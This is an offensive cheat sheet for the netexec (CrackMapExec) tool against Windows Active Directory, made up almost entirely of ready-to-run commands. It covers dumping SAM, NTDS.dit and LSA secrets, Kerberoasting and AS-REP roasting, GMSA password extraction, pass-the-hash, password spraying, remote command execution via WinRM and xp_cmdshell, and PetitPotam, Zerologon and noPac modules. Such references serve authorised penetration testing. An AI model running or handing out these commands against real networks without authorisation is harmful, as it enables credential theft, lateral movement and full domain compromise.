title: netexec
html:
netexec

Formerly CrackMapExec. Multi-protocol auth testing, enumeration, and command execution. Go-to for AD environments.

SMB Enumeration

# Check SMB signing & OS info
nxc smb <target>

# Null session enum
nxc smb <target> -u '' -p '' --shares
nxc smb <target> -u 'guest' -p '' --shares

# Authenticated share enum
nxc smb <target> -u user -p 'pass' --shares

# Enumerate users
nxc smb <target> -u user -p 'pass' --users

# RID brute (find users without creds)
nxc smb <target> -u 'guest' -p '' --rid-brute 10000

# Password policy
nxc smb <target> -u user -p 'pass' --pass-pol

# Spider shares for files
nxc smb <target> -u user -p 'pass' -M spider_plus

# Dump SAM hashes (local admin)
nxc smb <target> -u admin -p 'pass' --sam

# Dump NTDS.dit (domain admin on DC)
nxc smb <target> -u admin -p 'pass' --ntds

# Dump LSA secrets
nxc smb <target> -u admin -p 'pass' --lsa

# List logged-on users
nxc smb <target> -u user -p 'pass' --loggedon-users

# Enum groups
nxc smb <target> -u user -p 'pass' --groups

LDAP Enumeration

# Enumerate domain users
nxc ldap <DC> -u user -p 'pass' --users

# Enumerate groups
nxc ldap <DC> -u user -p 'pass' --groups

# AS-REP roastable users
nxc ldap <DC> -u user -p 'pass' --asreproast asrep.txt

# Kerberoastable users
nxc ldap <DC> -u user -p 'pass' --kerberoasting kerb.txt

# Get user descriptions (often contain passwords)
nxc ldap <DC> -u user -p 'pass' -M get-desc-users

# Enumerate trusts
nxc ldap <DC> -u user -p 'pass' --trusted-for-delegation

# GMSA passwords
nxc ldap <DC> -u user -p 'pass' --gmsa

WinRM Execution

# Check WinRM access
nxc winrm <target> -u user -p 'pass'

# Execute cmd command
nxc winrm <target> -u user -p 'pass' -x 'whoami /all'

# Execute PowerShell command
nxc winrm <target> -u user -p 'pass' -X 'Get-Process'

RDP

# Check RDP access
nxc rdp <target> -u user -p 'pass'

# Screenshot (if accessible)
nxc rdp <target> -u user -p 'pass' --screenshot

MSSQL

# Check access
nxc mssql <target> -u user -p 'pass'

# Execute query
nxc mssql <target> -u user -p 'pass' -q 'SELECT name FROM master.dbo.sysdatabases'

# Command execution via xp_cmdshell
nxc mssql <target> -u user -p 'pass' -x 'whoami'

# Windows auth
nxc mssql <target> -u user -p 'pass' -d domain

Authentication Variants

# Password auth
nxc smb <target> -u user -p 'pass'

# Hash auth (pass-the-hash)
nxc smb <target> -u user -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH'

# Kerberos auth
nxc smb <target> -u user -p 'pass' -k

# Local auth (not domain)
nxc smb <target> -u user -p 'pass' --local-auth

Password Spraying

# Single password across user list
nxc smb <target> -u users.txt -p 'Spring2024!' --continue-on-success

# Multiple passwords (careful with lockout)
nxc smb <target> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Spray across protocols
nxc winrm <target> -u users.txt -p 'pass' --continue-on-success
nxc rdp <target> -u users.txt -p 'pass' --continue-on-success

Useful Modules

# List available modules
nxc smb -L

# PetitPotam coercion
nxc smb <target> -u user -p 'pass' -M petitpotam

# WebDAV check
nxc smb <target> -u user -p 'pass' -M webdav

# GPP passwords (legacy)
nxc smb <target> -u user -p 'pass' -M gpp_password

# Enum DNS
nxc smb <target> -u user -p 'pass' -M enum_dns

# Zerologon check
nxc smb <DC> -M zerologon

# noPac check
nxc smb <DC> -u user -p 'pass' -M nopac

Output & Tips

# Pwn3d! = admin access confirmed
# [+] = successful auth
# Save creds database at ~/.nxc/

# Export results
nxc smb <target> -u user -p 'pass' --shares --export shares.json
